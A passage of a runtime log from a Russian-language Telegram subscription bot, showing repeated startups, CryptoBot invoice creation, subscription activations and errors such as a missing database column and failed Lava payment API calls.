  File "C:\python310\lib\site-packages\aiosqlite\context.py", line 39, in __aenter__
    self._obj = await self._coro
  File "C:\python310\lib\site-packages\aiosqlite\core.py", line 193, in execute
    cursor = await self._execute(self._conn.execute, sql, parameters)
  File "C:\python310\lib\site-packages\aiosqlite\core.py", line 132, in _execute
    return await future
  File "C:\python310\lib\site-packages\aiosqlite\core.py", line 115, in run
    result = function()
sqlite3.OperationalError: table payments has no column named pay_url
2026-05-18 21:32:34 | INFO     | __main__ | Запуск бота...
2026-05-18 21:32:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:32:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:32:34 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 21:32:34 | INFO     | __main__ | Запуск polling...
2026-05-18 21:32:34 | INFO     | database.db | База данных инициализирована
2026-05-18 21:32:34 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 21:32:34 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 21:32:34 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 21:32:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 21:32:35 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 21:32:35 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 21:32:36 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 21:32:36 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 21:32:37 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 21:32:37 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 21:32:37 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 21:32:37 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 21:32:37 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:32:41 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866692
2026-05-18 21:32:41 | ERROR    | aiogram.event | Cause exception while process update id=676578699 by bot id=7203775205
TypeError: create_payment() got an unexpected keyword argument 'pay_url'
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\payment.py", line 181, in create_invoice
    await create_payment(
TypeError: create_payment() got an unexpected keyword argument 'pay_url'
2026-05-18 21:33:50 | INFO     | __main__ | Запуск бота...
2026-05-18 21:33:50 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:33:50 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:33:50 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 21:33:50 | INFO     | __main__ | Запуск polling...
2026-05-18 21:33:51 | INFO     | database.db | База данных инициализирована
2026-05-18 21:33:51 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 21:33:51 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 21:33:51 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 21:33:51 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 21:33:51 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 21:33:51 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 21:33:51 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 21:33:51 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 21:33:52 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 21:33:52 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 21:33:52 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 21:33:52 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 21:33:54 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:34:00 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866800
2026-05-18 21:34:00 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51866800
2026-05-18 21:34:13 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866815
2026-05-18 21:34:13 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51866815
2026-05-18 21:34:46 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866866
2026-05-18 21:34:46 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51866866
2026-05-18 21:35:01 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866889
2026-05-18 21:35:02 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51866889
2026-05-18 21:35:13 | INFO     | database.db | Подписка активирована: user_id=733970441, type=month
2026-05-18 21:35:13 | INFO     | utils.channel | Создана инвайт-ссылка: https://t.me/+p9hv5R4p2pgxNmY6
2026-05-18 21:35:13 | INFO     | handlers.payment | Оплата подтверждена: user=733970441, tariff=month
2026-05-18 21:35:24 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:35:27 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866919
2026-05-18 21:35:27 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51866919
2026-05-18 21:35:47 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51866937
2026-05-18 21:35:47 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51866937
2026-05-18 21:37:16 | ERROR    | payments.cryptobot | CryptoBot сетевая ошибка: 0, message='Attempt to decode JSON with unexpected mimetype: text/html', url=URL('https://pay.crypt.bot/api/createInvoice')
2026-05-18 21:37:23 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51867053
2026-05-18 21:37:23 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51867053
2026-05-18 21:38:36 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51867154
2026-05-18 21:38:36 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51867154
2026-05-18 21:38:45 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51867162
2026-05-18 21:38:45 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51867162
2026-05-18 21:39:00 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51867178
2026-05-18 21:39:00 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51867178
2026-05-18 21:39:10 | ERROR    | payments.lava | Lava API error: {'status': 'error', 'message': 'Invalid token', 'code': 5, 't': 'Empty $jwt'}
2026-05-18 21:45:08 | INFO     | __main__ | Запуск бота...
2026-05-18 21:45:08 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:45:08 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 21:45:08 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 21:45:08 | INFO     | __main__ | Запуск polling...
2026-05-18 21:45:08 | INFO     | database.db | База данных инициализирована
2026-05-18 21:45:08 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 21:45:08 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 21:45:08 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 21:45:08 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 21:45:09 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 21:45:09 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 21:45:11 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 21:45:11 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 21:45:11 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 21:45:11 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 21:45:11 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 21:45:11 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 21:45:24 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:45:34 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51867738
2026-05-18 21:45:35 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51867738
2026-05-18 21:45:52 | INFO     | database.db | Подписка активирована: user_id=733970441, type=month
2026-05-18 21:45:52 | INFO     | utils.channel | Создана инвайт-ссылка: https://t.me/+sZsbsCDYYmQ3ZmMy
2026-05-18 21:45:52 | INFO     | handlers.payment | Автопроверка: оплата подтверждена user=733970441
2026-05-18 21:46:06 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:46:11 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51867787
2026-05-18 21:46:12 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51867787
2026-05-18 21:46:22 | INFO     | database.db | Подписка активирована: user_id=733970441, type=forever
2026-05-18 21:46:22 | INFO     | utils.channel | Создана инвайт-ссылка: https://t.me/+aJxnHyyNMm81YjMy
2026-05-18 21:46:22 | INFO     | handlers.payment | Оплата подтверждена: user=733970441, tariff=forever
2026-05-18 21:46:30 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:46:34 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51867824
2026-05-18 21:46:35 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51867824
2026-05-18 21:47:48 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 21:47:56 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51867918
2026-05-18 21:47:56 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51867918
2026-05-18 21:48:12 | INFO     | database.db | Подписка активирована: user_id=733970441, type=month
2026-05-18 21:48:12 | INFO     | utils.channel | Создана инвайт-ссылка: https://t.me/+dtUaheu8q7U0Yjgy
2026-05-18 21:48:12 | INFO     | handlers.payment | Автопроверка: оплата подтверждена user=733970441
2026-05-18 22:21:50 | INFO     | __main__ | Запуск бота...
2026-05-18 22:21:50 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 22:21:50 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 22:21:50 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 22:21:50 | INFO     | __main__ | Запуск polling...
2026-05-18 22:21:51 | INFO     | database.db | База данных инициализирована
2026-05-18 22:21:51 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 22:21:51 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 22:21:51 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 22:21:51 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 22:21:51 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 22:21:51 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 22:21:53 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 22:21:53 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 22:21:55 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 22:21:55 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 22:21:55 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 22:21:55 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 22:22:29 | INFO     | __main__ | Запуск бота...
2026-05-18 22:22:29 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 22:22:29 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-18 22:22:29 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-18 22:22:29 | INFO     | __main__ | Запуск polling...
2026-05-18 22:22:29 | INFO     | database.db | База данных инициализирована
2026-05-18 22:22:29 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-18 22:22:29 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-18 22:22:29 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-18 22:22:29 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-18 22:22:29 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-18 22:22:29 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-18 22:22:30 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-18 22:22:30 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-18 22:22:30 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-18 22:22:30 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-18 22:22:30 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-18 22:22:31 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-18 22:22:42 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 22:22:46 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51870691
2026-05-18 22:22:47 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51870691
2026-05-18 22:22:52 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51870699
2026-05-18 22:22:52 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51870699
2026-05-18 22:23:07 | INFO     | database.db | Подписка активирована: user_id=733970441, type=month
2026-05-18 22:23:07 | INFO     | utils.channel | Создана инвайт-ссылка: https://t.me/+Qm0ibIkfocM5Yzdi
2026-05-18 22:23:07 | INFO     | handlers.payment | Оплата подтверждена: user=733970441, tariff=month
2026-05-18 22:23:11 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-18 22:23:15 | INFO     | utils.currency | Курс USD/RUB обновлён: 73.15523
2026-05-18 22:23:15 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-18 22:23:56 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-18 23:30:55 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-19 20:24:20 | INFO     | __main__ | Запуск бота...
2026-05-19 20:24:20 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-19 20:24:20 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-19 20:24:20 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-19 20:24:20 | INFO     | __main__ | Запуск polling...
2026-05-19 20:24:20 | INFO     | database.db | База данных инициализирована
2026-05-19 20:24:20 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-19 20:24:20 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-19 20:24:20 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-19 20:24:20 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-19 20:24:21 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBu2oL...
2026-05-19 20:24:21 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-19 20:24:22 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBvGoL...
2026-05-19 20:24:22 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-19 20:24:23 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBvWoL...
2026-05-19 20:24:23 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-19 20:24:23 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-19 20:24:23 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-19 20:24:27 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-19 20:24:35 | INFO     | utils.currency | Курс USD/RUB обновлён: 72.535435
2026-05-19 20:24:35 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-19 20:43:02 | INFO     | handlers.start | Пользователь 6771533657 (zzzxxxccceee) запустил бота
2026-05-19 21:25:45 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 51942274
2026-05-19 21:25:45 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=51942274
2026-05-19 21:25:52 | INFO     | utils.currency | Курс USD/RUB обновлён: 72.535435
2026-05-19 21:25:52 | ERROR    | payments.lava | Lava API HTTP 404: {'data': None, 'error': 'Проект не найден', 'status': 404, 'status_check': False}
2026-05-19 21:38:31 | INFO     | __main__ | Запуск бота...
2026-05-19 21:38:31 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-19 21:38:31 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-19 21:38:31 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-19 21:38:31 | INFO     | __main__ | Запуск polling...
2026-05-19 21:38:31 | INFO     | database.db | База данных инициализирована
2026-05-19 21:38:31 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-19 21:38:31 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-19 21:38:31 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-19 21:38:31 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-19 21:38:38 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-19 21:38:38 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-19 21:38:39 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-19 21:38:39 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-19 21:38:40 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-19 21:38:40 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-19 21:38:40 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-19 21:38:40 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-19 21:38:46 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-19 21:42:06 | INFO     | __main__ | Запуск бота...
2026-05-19 21:42:06 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-19 21:42:06 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-19 21:42:06 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-19 21:42:06 | INFO     | __main__ | Запуск polling...
2026-05-19 21:42:06 | INFO     | database.db | База данных инициализирована
2026-05-19 21:42:06 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-19 21:42:06 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-19 21:42:06 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-19 21:42:06 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-19 21:42:07 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-19 21:42:07 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-19 21:42:08 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-19 21:42:08 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-19 21:42:09 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-19 21:42:09 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-19 21:42:09 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-19 21:42:09 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-19 21:43:02 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-19 21:43:50 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-19 22:43:41 | INFO     | __main__ | Запуск бота...
2026-05-19 22:43:41 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-19 22:43:41 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-19 22:43:41 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-19 22:43:41 | INFO     | __main__ | Запуск polling...
2026-05-19 22:43:41 | INFO     | database.db | База данных инициализирована
2026-05-19 22:43:41 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-19 22:43:41 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-19 22:43:41 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-19 22:43:41 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-19 22:43:42 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-19 22:43:42 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-19 22:43:43 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-19 22:43:43 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-19 22:57:11 | INFO     | __main__ | Запуск бота...
2026-05-19 22:57:11 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-19 22:57:11 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-19 22:57:11 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-19 22:57:11 | INFO     | __main__ | Запуск polling...
2026-05-19 22:57:11 | INFO     | database.db | База данных инициализирована
2026-05-19 22:57:11 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-19 22:57:11 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-19 22:57:11 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-19 22:57:11 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-19 22:57:12 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-19 22:57:12 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-19 22:57:12 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-19 22:57:12 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-19 22:57:13 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-19 22:57:13 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-19 22:57:13 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-19 22:57:13 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-19 23:03:16 | INFO     | handlers.start | Пользователь 1949879714 (izmestev_a) запустил бота
2026-05-20 20:11:13 | INFO     | __main__ | Запуск бота...
2026-05-20 20:11:13 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-20 20:11:13 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-20 20:11:13 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-20 20:11:13 | INFO     | __main__ | Запуск polling...
2026-05-20 20:11:13 | INFO     | database.db | База данных инициализирована
2026-05-20 20:11:13 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-20 20:11:13 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-20 20:11:13 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-20 20:11:13 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-20 20:11:14 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-20 20:11:14 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-20 20:11:17 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-20 20:11:17 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-20 20:11:20 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-20 20:11:20 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-20 20:11:20 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-20 20:11:20 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-20 20:11:50 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-20 20:11:58 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-20 20:12:20 | INFO     | payments.cryptobot | CryptoBot инвойс создан: 52015673
2026-05-20 20:12:20 | INFO     | handlers.payment | Инвойс создан: user=733970441, system=cryptobot, invoice=52015673
2026-05-20 20:46:06 | INFO     | __main__ | Запуск бота...
